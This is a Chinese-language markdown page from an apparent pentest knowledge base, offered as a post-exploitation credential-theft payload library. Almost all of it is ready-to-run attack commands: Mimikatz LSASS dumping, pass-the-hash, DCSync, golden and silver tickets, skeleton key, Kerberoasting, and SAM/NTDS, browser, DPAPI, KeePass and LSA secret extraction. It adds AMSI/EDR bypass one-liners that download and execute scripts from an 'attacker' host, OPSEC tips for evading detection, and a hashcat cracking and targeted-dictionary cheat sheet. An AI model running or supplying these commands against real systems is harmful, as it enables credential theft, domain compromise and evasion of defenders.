# 内网/后渗透 — 凭证窃取 payload 库

> 父文档:[00-index.md](00-index.md) · ⚠️ 渗透测试场景下大多受限,见 [../../compliance.md](../../compliance.md)
> 涵盖:Mimikatz / LSASS dump / 浏览器密码 / DPAPI / Kerberos ticket / 桌面凭据 / SSH key / 应用凭据

---

### Mimikatz凭证抓取  `mimikatz-creds`
使用Mimikatz抓取Windows系统凭证
子类：**Mimikatz** · tags: `mimikatz` `credentials` `windows` `lsass`

**前置条件：** 需要管理员权限；需要绕过杀毒软件；Windows系统

**攻击链：**

**1. 抓取所有凭证**  _[windows]_
_抓取LSASS中的所有登录凭证_
```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

**2. 导出LSASS**  _[windows]_
_从LSASS转储文件中提取凭证_
```
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
```

**3. Pass-the-Hash**  _[windows]_
_使用NTLM哈希进行Pass-the-Hash攻击_
```
mimikatz.exe "sekurlsa::pth /user:Administrator /domain:target.com /ntlm:HASH" "exit"
```

**4. DCSync攻击**  _[windows]_
_模拟DC同步获取域内所有用户哈希_
```
mimikatz.exe "lsadump::dcsync /domain:target.com /user:Administrator" "exit"
```

**5. 导出所有哈希**  _[windows]_
_从LSA导出所有用户哈希_
```
mimikatz.exe "lsadump::lsa /inject" "exit"
```

**6. 黄金票据**  _[windows]_
_生成黄金票据获取域管理员权限_
```
mimikatz.exe "kerberos::golden /domain:target.com /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator" "exit"
```

**7. 白银票据**  _[windows]_
_生成白银票据访问特定服务_
```
mimikatz.exe "kerberos::golden /domain:target.com /sid:S-1-5-21-xxx /target:server.target.com /service:cifs /rc4:HASH /user:Administrator" "exit"
```

**EDR 绕过变体：**

**1. PowerShell加载**
_通过PowerShell远程加载Mimikatz_
```
IEX (New-Object Net.WebClient).DownloadString("http://attacker/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords"
```

**2. AMSI绕过**
_禁用AMSI后加载Mimikatz_
```
SET-ITEM -PATH "HKLM:\SOFTWARE\Microsoft\AMSI" -NAME "AllowBlocking" -VALUE 1; IEX (New-Object Net.WebClient).DownloadString("http://attacker/Invoke-Mimikatz.ps1")
```

**3. 混淆执行**
_通过反射绕过AMSI_
```
$a='[Ref].Assembly.GetType'('System.Management.Automation.AmsiUtils');$b=$a.GetField'('amsiInitFailed','NonPublic,Static');$b.SetValue($null,$true);IEX(New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
```

**分析：** 成功执行后可获取明文密码、NTLM哈希、Kerberos票据等凭证信息。

**OPSEC：** Mimikatz会被大多数杀软检测；使用混淆或内存加载绕过检测；优先考虑使用其他更隐蔽的工具；操作LSASS会触发EDR告警

---

### Kerberoasting攻击  `kerberoasting`
Kerberoasting攻击获取服务账户哈希
子类：**Kerberos** · tags: `kerberoasting` `kerberos` `active-directory` `spn`

**前置条件：** 域环境；任意域用户凭证；域内存在SPN账户

**攻击链：**

**1. 发现SPN**  _[windows]_
_查询域内所有SPN_
```
setspn -T domain.com -Q */*
```

**2. 请求服务票据**  _[windows]_
_PowerShell请求Kerberos票据_
```
Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/webserver.target.com"
```

**3. 导出票据**  _[windows]_
_使用Mimikatz导出Kerberos票据_
```
mimikatz.exe "kerberos::list /export" "exit"
```

**4. Rubeus请求**  _[windows]_
_使用Rubeus进行Kerberoasting_
```
Rubeus.exe kerberoast /stats
```

**5. Impacket GetUserSPNs**  _[linux]_
_使用Impacket获取服务票据_
```
GetUserSPNs.py domain/user:password -dc-ip dc_ip -request
```

**6. 离线破解**  _[linux]_
_使用Hashcat破解Kerberos票据_
```
hashcat -m 13100 kerberoast.hash wordlist.txt
```

**EDR 绕过变体：**

**1. RC4加密**
_使用RC4加密，避免触发告警_
```
Rubeus.exe kerberoast /rc4opsec
```

**分析：** Kerberoasting可以获取服务账户的Kerberos票据，离线破解后得到明文密码。

**OPSEC：** Kerberoasting不需要高权限；只需要任意域用户凭证；建议使用RC4加密避免检测

---

### AS-REP Roasting  `asreproasting`
AS-REP Roasting攻击获取用户哈希
子类：**Kerberos** · tags: `asreproasting` `kerberos` `active-directory`

**前置条件：** 域环境；域中存在禁用Pre-auth的用户

**攻击链：**

**1. Rubeus攻击**  _[windows]_
_使用Rubeus进行AS-REP Roasting_
```
Rubeus.exe asreproast
```

**2. Impacket攻击**  _[linux]_
_使用Impacket获取AS-REP_
```
GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile hashes.txt
```

**3. 查找禁用Pre-auth用户**  _[windows]_
_查找禁用Pre-auth的用户_
```
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

**4. 破解哈希**  _[linux]_
_使用Hashcat破解AS-REP哈希_
```
hashcat -m 18200 asrep.hash wordlist.txt
```

**分析：** AS-REP Roasting可以获取禁用Pre-auth用户的哈希，离线破解后得到明文密码。

**OPSEC：** 不需要任何凭证；只需要用户名；禁用Pre-auth是错误配置

---

### LaZagne凭证抓取  `lazagne-creds`
使用LaZagne抓取各种应用程序凭证
子类：**工具** · tags: `lazagne` `credentials` `browsers` `applications`

**前置条件：** 目标机器访问权限；LaZagne工具

**攻击链：**

**1. 抓取所有凭证**  _[windows]_
_抓取所有支持的凭证_
```
laZagne.exe all
```

**2. 浏览器凭证**  _[windows]_
_抓取浏览器保存的密码_
```
laZagne.exe browsers
```

**3. WiFi凭证**  _[windows]_
_抓取WiFi密码_
```
laZagne.exe wifi
```

**4. 邮件客户端**  _[windows]_
_抓取邮件客户端密码_
```
laZagne.exe mails
```

**5. 数据库凭证**  _[windows]_
_抓取数据库客户端密码_
```
laZagne.exe databases
```

**6. Linux版本**  _[linux]_
_Linux版本抓取_
```
python laZagne.py all
```

**EDR 绕过变体：**

**1. 混淆执行**
_Base64编码执行_
```
python -c "exec(__import__(\"base64\").b64decode(\"BASE64_PAYLOAD\"))"
```

**分析：** LaZagne可以从浏览器、邮件客户端、数据库客户端等多种应用程序中提取保存的凭证。

**OPSEC：** LaZagne会被杀软检测；考虑使用混淆或内存加载；可以只运行特定模块

---

### SAM数据库导出  `sam-dump`
导出Windows SAM数据库获取本地账户哈希
子类：**SAM** · tags: `sam` `hash` `windows` `local`

**前置条件：** 管理员权限；Windows系统

**攻击链：**

**1. reg导出**  _[windows]_
_导出SAM和SYSTEM配置单元_
```
reg save HKLM\SAM sam.hive & reg save HKLM\SYSTEM system.hive
```

**2. Impacket解析**  _[linux]_
_使用Impacket解析SAM_
```
secretsdump.py -sam sam.hive -system system.hive LOCAL
```

**3. Mimikatz导出**  _[windows]_
_使用Mimikatz导出SAM_
```
mimikatz.exe "lsadump::sam" "exit"
```

**4. Volume Shadow Copy**  _[windows]_
_从卷影副本复制SAM_
```
vssadmin create shadow /for=C: & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\sam.hive
```

**分析：** SAM数据库包含本地账户的NTLM哈希，可以用于破解或Pass-the-Hash。

**OPSEC：** 需要管理员权限；操作注册表可能触发告警；卷影副本方法更隐蔽

---

### NTDS.dit导出  `ntds-dump`
导出Active Directory数据库获取所有域用户哈希
子类：**NTDS** · tags: `ntds` `active-directory` `hash` `domain`

**前置条件：** 域管理员权限；域控制器访问权限

**攻击链：**

**1. ntdsutil快照**  _[windows]_
_使用ntdsutil创建IFM快照_
```
ntdsutil "activate instance ntds" "ifm" "create full c:\temp" "quit" "quit"
```

**2. Volume Shadow Copy**  _[windows]_
_从卷影副本复制NTDS.dit_
```
vssadmin create shadow /for=C: & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit
```

**3. Impacket解析**  _[linux]_
_使用Impacket解析NTDS.dit_
```
secretsdump.py -ntds ntds.dit -system system.hive LOCAL
```

**4. Impacket远程转储**  _[linux]_
_远程转储域哈希_
```
secretsdump.py domain/admin:password@dc_ip -just-dc
```

**5. Mimikatz DCSync**  _[windows]_
_使用DCSync同步所有哈希_
```
mimikatz.exe "lsadump::dcsync /domain:target.com /all" "exit"
```

**分析：** NTDS.dit包含域内所有用户的哈希，可以用于破解或Pass-the-Hash。

**OPSEC：** 需要域管理员权限；DCSync方法更隐蔽；操作可能触发大量告警

---

### GPP密码提取  `gpp-password`
提取组策略首选项中的密码
子类：**GPP** · tags: `gpp` `group-policy` `password` `xml`

**前置条件：** 域环境；任意域用户凭证

**攻击链：**

**1. 查找GPP文件**  _[linux]_
_查找SYSVOL中的XML文件_
```
find /domain/sysvol -name "*.xml" 2>/dev/null
```

**2. PowerShell查找**  _[windows]_
_PowerShell查找GPP文件_
```
Get-ChildItem -Path "\\domain.com\SYSVOL" -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match "\.xml$"}
```

**3. PowerView提取**  _[windows]_
_使用PowerView提取GPP密码_
```
Get-NetGPPPassword
```

**4. gpp-decrypt**  _[linux]_
_解密GPP密码哈希_
```
gpp-decrypt HASH
```

**5. Impacket提取**  _[linux]_
_使用Impacket提取GPP密码_
```
Get-GPPPassword.py domain/user:password@dc_ip
```

**分析：** GPP密码使用公开的密钥加密，可以被解密获取明文密码。

**OPSEC：** GPP密码是常见的信息泄露点；只需要普通域用户权限；MS14-025修复后新密码不会被存储

---

### Mimikatz高级技巧  `mimikatz-advanced`
Mimikatz高级凭证提取和利用技术
子类：**Mimikatz** · tags: `mimikatz` `credentials` `advanced`

**前置条件：** 管理员权限；Mimikatz工具

**攻击链：**

**1. DCSync攻击**  _[windows]_
_模拟DC同步获取域管哈希_
```
lsadump::dcsync /domain:domain.com /user:Administrator
```

**2. 黄金票据生成**  _[windows]_
_生成黄金票据并注入_
```
kerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator /ptt
```

**3. 白银票据生成**  _[windows]_
_生成白银票据访问特定服务_
```
kerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /target:server /service:cifs /rc4:HASH /user:Administrator /ptt
```

**4. Skeleton Key植入**  _[windows]_
_植入万能密码mimikatz_
```
privilege::debug
misc::skeleton
```

---

### 浏览器凭证提取  `browser-creds`
从浏览器中提取保存的密码和Cookie
子类：**浏览器** · tags: `browser` `credentials` `chrome` `firefox`

**前置条件：** 用户权限；浏览器已保存密码

**攻击链：**

**1. Chrome密码提取**  _[windows]_
_复制Chrome登录数据库_
```
Get-ChildItem -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" | Copy-Item -Destination "C:\temp\Login Data"
```

**2. Chrome Cookie提取**  _[windows]_
_复制Chrome Cookie数据库_
```
Get-ChildItem -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies" | Copy-Item -Destination "C:\temp\Cookies"
```

**3. 使用SharpWeb**  _[windows]_
_使用SharpWeb提取浏览器凭证_
```
SharpWeb.exe --browser chrome
```

**4. 使用HackBrowserData**
_提取Chrome所有数据_
```
hack-browser-data.exe -b chrome
```

---

### DPAPI凭证提取  `dpapi-creds`
从DPAPI保护存储中提取凭证
子类：**DPAPI** · tags: `dpapi` `credentials` `windows`

**前置条件：** 用户权限；DPAPI master key

**攻击链：**

**1. 枚举DPAPI凭据**  _[windows]_
_查找DPAPI保护的凭据文件_
```
Get-ChildItem -Path "$env:APPDATA\Microsoft\Credentials" -Force
```

**2. 使用Mimikatz解密**  _[windows]_
_解密DPAPI凭据_
```
dpapi::cred /in:C:\Users\user\AppData\Roaming\Microsoft\Credentials\XXX
```

**3. 获取Master Key**  _[windows]_
_从内存获取DPAPI master key_
```
sekurlsa::dpapi
```

---

### RDP凭证提取  `rdp-creds`
提取保存的RDP连接密码
子类：**RDP** · tags: `rdp` `credentials` `windows`

**前置条件：** 用户权限；已保存RDP密码

**攻击链：**

**1. 查找RDP文件**  _[windows]_
_查找RDP连接文件_
```
Get-ChildItem -Path "$env:USERPROFILE\Documents\*.rdp" -Recurse
```

**2. 提取RDP密码**  _[windows]_
_列出保存的凭据_
```
cmdkey /list
```

**3. 使用Mimikatz**  _[windows]_
_解密RDP保存的密码_
```
dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\XXX
```

---

### WiFi凭证提取  `wifi-creds`
提取保存的WiFi密码
子类：**WiFi** · tags: `wifi` `credentials` `windows`

**前置条件：** 管理员权限；已连接WiFi

**攻击链：**

**1. 列出WiFi配置文件**  _[windows]_
_显示所有WiFi配置文件_
```
netsh wlan show profiles
```

**2. 提取WiFi密码**  _[windows]_
_显示WiFi密码_
```
netsh wlan show profile name="WiFi_Name" key=clear
```

---

### Windows Vault凭证  `vault-creds`
从Windows凭据管理器提取凭证
子类：**Vault** · tags: `vault` `credentials` `windows`

**前置条件：** 用户权限；已保存凭据

**攻击链：**

**1. 列出Vault凭据**  _[windows]_
_列出所有Vault_
```
vaultcmd /list
```

**2. 导出Vault凭据**  _[windows]_
_列出Windows凭据_
```
vaultcmd /listcreds:"Windows Credentials" /all
```

**3. 使用Mimikatz**  _[windows]_
_从内存提取凭据管理器密码_
```
sekurlsa::credman
```

---

### KeePass凭证提取  `keepass-dump`
从KeePass数据库提取密码
子类：**KeePass** · tags: `keepass` `credentials` `password-manager`

**前置条件：** KeePass数据库文件；主密码或内存转储

**攻击链：**

**1. 查找KeePass数据库**  _[windows]_
_搜索KeePass数据库文件_
```
Get-ChildItem -Path C:\ -Filter "*.kdbx" -Recurse -ErrorAction SilentlyContinue
```

**2. 内存提取主密码**  _[windows]_
_从KeePass进程内存提取_
```
使用KeePassDump或KeeThief从内存提取主密码
```

**3. 使用KeeThief**  _[windows]_
_PowerShell提取KeePass密码_
```
powershell -exec bypass -c "IEX(New-Object Net.WebClient).downloadString('http://attacker/KeeThief.ps1'); Get-KeePassPw
```

---

### LSA Secrets提取  `lsa-secrets`
从LSA Secrets提取敏感数据
子类：**LSA** · tags: `lsa` `secrets` `windows`

**前置条件：** SYSTEM权限

**攻击链：**

**1. 使用Mimikatz**  _[windows]_
_提取LSA Secrets_
```
lsadump::secrets
```

**2. 使用reg save**  _[windows]_
_导出注册表hive离线分析_
```
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM system.hive
```

**3. 使用Impacket**  _[linux]_
_离线提取LSA Secrets_
```
secretsdump.py -security security.hive -system system.hive LOCAL
```

---

### 缓存凭证提取  `cached-creds`
提取域缓存凭证
子类：**缓存** · tags: `cached` `credentials` `domain`

**前置条件：** SYSTEM权限；域环境

**攻击链：**

**1. 使用Mimikatz**  _[windows]_
_提取缓存域凭证_
```
lsadump::cache
```

**2. 使用reg save**  _[windows]_
_导出SECURITY hive_
```
reg save HKLM\SECURITY security.hive
```

**3. 离线破解**  _[linux]_
_缓存凭证可离线破解_
```
使用hashcat破解缓存的域凭证
```

---

### DCSync攻击  `dcsync-attack`
模拟域控制器同步获取凭证
子类：**域渗透** · tags: `dcsync` `domain-controller` `mimikatz`

**前置条件：** 域管理员权限或特定权限

**攻击链：**

**1. 使用Mimikatz**  _[windows]_
_使用Mimikatz执行DCSync_
```
mimikatz # lsadump::dcsync /domain:domain.com /user:Administrator
```

**2. 使用impacket**  _[linux]_
_使用impacket执行DCSync_
```
python secretsdump.py -just-dc-user Administrator domain.com/user:password@dc_ip
```

**3. 导出所有哈希**  _[windows]_
_导出域内所有用户哈希_
```
mimikatz # lsadump::dcsync /domain:domain.com /all /csv
```

**4. 权限要求**
_DCSync所需权限_
```
需要以下权限之一:
- Domain Admin
- Enterprise Admin
- 复制目录更改权限
```

---

### 黄金票据攻击  `golden-ticket`
使用krbtgt哈希生成黄金票据
子类：**域持久化** · tags: `golden-ticket` `krbtgt` `kerberos`

**前置条件：** krbtgt账户哈希；域SID

**攻击链：**

**1. 获取krbtgt哈希**  _[windows]_
_获取krbtgt账户哈希_
```
mimikatz # lsadump::lsa /inject /name:krbtgt
```

**2. 获取域SID**  _[windows]_
_获取域SID_
```
whoami /user
或: wmic useraccount get sid
```

**3. 生成黄金票据**  _[windows]_
_生成并注入黄金票据_
```
mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:HASH /ptt
```

**4. 验证票据**  _[windows]_
_验证黄金票据是否有效_
```
klist
或: dir \\dc.domain.com\c$
```

---

### 白银票据攻击  `silver-ticket`
使用服务账户哈希生成白银票据
子类：**域持久化** · tags: `silver-ticket` `kerberos` `service`

**前置条件：** 服务账户哈希；域SID

**攻击链：**

**1. 获取服务哈希**  _[windows]_
_获取服务账户哈希_
```
mimikatz # sekurlsa::logonpasswords
寻找服务账户NTLM哈希
```

**2. 生成白银票据**  _[windows]_
_生成针对特定服务的票据_
```
mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /target:server.domain.com /service:cifs /rc4:HASH /ptt
```

**3. 常见服务类型**
_可伪造的服务类型_
```
CIFS - 文件共享
HTTP - Web服务
LDAP - 目录服务
MSSQLSvc - SQL服务
HOST - 远程管理
```

---

### 无人值守安装凭证提取  `unattended-creds`
从Windows无人值守安装文件(Unattend.xml/Sysprep)中提取明文或Base64编码的管理员凭证
子类：**文件凭证** · tags: `credentials` `unattend` `sysprep` `privilege-escalation` `windows`

**前置条件：** 本地文件系统读取权限；目标使用过无人值守部署

**攻击链：**

**1. 搜索无人值守安装文件**  _[windows]_
_在默认路径搜索Unattend/Sysprep配置文件，这些文件在Windows自动部署后可能残留在系统中_
```
dir /s /b C:\Windows\Panther\Unattend.xml C:\Windows\Panther\unattended.xml C:\Windows\Panther\Autounattend.xml C:\Windows\System32\Sysprep\sysprep.xml C:\Windows\System32\Sysprep\unattend.xml 2>nul
```

**2. 全盘搜索Unattend文件**  _[windows]_
_当默认路径找不到时，全盘递归搜索所有可能的无人值守文件_
```
# CMD方式
dir /s /b C:\*unattend*.xml C:\*sysprep*.xml 2>nul

# PowerShell方式
Get-ChildItem -Path C:\ -Recurse -Include "*unattend*","*sysprep*","*autounattend*" -ErrorAction SilentlyContinue | Select-Object FullName
```

**3. 提取明文密码**  _[windows]_
_从Unattend.xml中提取密码字段，密码可能以明文或Base64编码形式存储在<Password>/<AdminPassword>/<AutoLogon>节点中_
```
# 查看文件内容
type C:\Windows\Panther\Unattend.xml

# 关键字段搜索
findstr /i /c:"Password" /c:"AutoLogon" /c:"AdminPassword" C:\Windows\Panther\Unattend.xml

# PowerShell提取
[xml]$xml = Get-Content C:\Windows\Panther\Unattend.xml
$xml.unattend.settings.component | Where-Object { $_.AutoLogon } | ForEach-Object { $_.AutoLogon.Password.Value }
```

**4. 解码Base64密码**  _[windows]_
_Unattend.xml中的密码如果以Base64编码存储，需要解码。Windows使用UTF-16LE编码，因此必须用Unicode解码而非ASCII_
```
# PowerShell解码Base64
$encoded = "QQBkAG0AaQBuAEAAMQAyADMA"  # 从XML提取的编码值
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))

# 或者使用certutil
echo QQBkAG0AaQBuAEAAMQAyADMA > C:\temp\encoded.txt
certutil -decode C:\temp\encoded.txt C:\temp\decoded.txt
type C:\temp\decoded.txt
```

**5. 检查其他敏感安装文件**  _[windows]_
_除Unattend.xml外，其他位置也可能存储明文凭证_
```
# 检查GPP(Group Policy Preferences)密码
findstr /S /I cpassword \\domain.com\sysvol\domain.com\policies\*.xml 2>nul

# 检查IIS配置文件
type C:\inetpub\wwwroot\web.config 2>nul | findstr /i "connectionString password"

# 检查VNC密码文件
reg query "HKCU\Software\ORL\WinVNC3\Password" 2>nul
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v Password 2>nul

# 检查WiFi密码
netsh wlan show profiles
netsh wlan show profile name="目标WiFi" key=clear
```

**6. 使用Metasploit自动化**  _[windows]_
_使用Metasploit后渗透模块自动搜索和提取无人值守安装文件中的凭证_
```
# Metasploit模块
use post/windows/gather/enum_unattend
set SESSION 1
run

# 也可以使用
use post/multi/gather/firefox_creds
use post/windows/gather/credentials/gpp
use post/windows/gather/cachedump
```

**EDR 绕过变体：**

**1. 绕过文件访问监控**  _[windows]_
_通过卷影副本或流式读取绕过文件访问监控_
```
# 使用Volume Shadow Copy读取被锁定的文件
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\Panther\Unattend.xml C:\temp\u.xml

# 使用PowerShell流式读取避免文件锁
[IO.File]::ReadAllText("C:\Windows\Panther\Unattend.xml")
```

**分析：** 无人值守安装文件是Windows大规模部署的产物。这些XML文件中的<UserAccounts>/<AutoLogon>节点可能包含本地管理员或域管理员的明文/编码凭证。该漏洞在企业环境中极为常见，因为IT部门经常忽略部署后清理这些文件。

**OPSEC：** 读取文件操作通常不会触发警报，但大量文件搜索(dir /s)可能被EDR检测。建议直接检查已知路径而非全盘搜索。

---

## 🔓 密码哈希离线破解速查

> 拿到哈希后快速定位 hashcat -m 值和攻击策略

### Hashcat 哈希类型速查 (-m)

| 哈希类型 | -m 值 | 来源 | 特征 |
|----------|-------|------|------|
| NTLM | 1000 | hashdump / secretsdump | 32 位十六进制 |
| NetNTLMv1 | 5500 | Responder (旧系统) | `::` 分隔的挑战-响应 |
| NetNTLMv2 | 5600 | Responder / ntlmrelayx | `::` 分隔含 domain |
| Kerberos TGS (Kerberoast) | 13100 | GetUserSPNs.py | `$krb5tgs$23$` 开头 |
| Kerberos AS-REP | 18200 | GetNPUsers.py | `$krb5asrep$23$` 开头 |
| DCC2 (域缓存凭据) | 2100 | secretsdump 域缓存 | `$DCC2$10240#` 开头 |
| MD5 | 0 | Web 数据库泄露 | 32 位十六进制 |
| SHA-256 | 1400 | — | 64 位十六进制 |
| sha512crypt ($6$) | 1800 | Linux /etc/shadow | `$6$` 开头 |
| bcrypt | 3200 | Web 应用 | `$2a$` / `$2b$` 开头 |
| WPA-PBKDF2 | 22000 | WiFi 握手包 | — |

### 攻击策略决策树

```
拿到哈希后:
├─ 知道哈希类型 → 直接 hashcat -m <值>
├─ 不确定类型 → hashcat --identify hashes.txt 或 hashid
├─ 有 GPU → hashcat（首选）
├─ 无 GPU / CPU 环境 → john the ripper
├─ 在线查询（先试） → hashes.org / crackstation.net
│
├─ 有目标个人信息（姓名/生日/电话） → ccupp 生成定向字典
│   └─ ccupp generate → hashcat -m 1000 hashes.txt ccupp_dict.txt
├─ 有通用字典 → hashcat + best64.rule
│   └─ hashcat -m 1000 hashes.txt rockyou.txt -r best64.rule
├─ 知道密码模式 → 掩码攻击
│   ├─ 8 位纯数字 → -a 3 ?d?d?d?d?d?d?d?d
│   └─ 首字母大写+6小写+1数字 → -a 3 ?u?l?l?l?l?l?l?d
└─ 未知模式 → 字典+规则 → 掩码逐渐递增
```

### 社工密码字典生成 (ccupp)

```bash
# 安装: f8x -install ccupp
# 原理: 姓名拼音变体 + 生日日期组合 + 电话尾号 + 文化数字(520/1314/888/666)

ccupp init                      # 生成配置模板
ccupp interactive               # 交互式输入目标信息
ccupp generate -o dict.txt       # 生成密码字典
ccupp generate --min-length 8 --max-length 16  # 匹配密码策略

# 生成优先级（从高到低）:
# 1. 旧密码变体 (大小写/leetspeak)
# 2. 姓名+生日 (中国用户最常见弱口令: zhangsan1990)
# 3. 姓名+电话尾号 (zs8000)
# 4. 双组件组合 (任意两类信息交叉)
# 5. 文化数字 (520/1314/888/666)
# 6. 键盘模式 (qwerty/1qaz2wsx)
```

### 实战场景速查

| 场景 | 命令 |
|------|------|
| Kerberoast 破解 | `hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule` |
| AS-REP 破解 | `hashcat -m 18200 asrep.txt rockyou.txt` |
| NTLM 批量破解 | `hashcat -m 1000 ntlm.txt rockyou.txt -r best64.rule -O` |
| NetNTLMv2 破解 | `hashcat -m 5600 responder.txt rockyou.txt` |
| Linux Shadow 破解 | `hashcat -m 1800 shadow.txt rockyou.txt -r best64.rule` |
| 恢复中断任务 | `hashcat --restore` |
| 查看已破解 | `hashcat -m 1000 hashes.txt --show` |

---

← 回 [00-index.md](00-index.md) · 下一篇:[`11-lateral.md`](11-lateral.md)
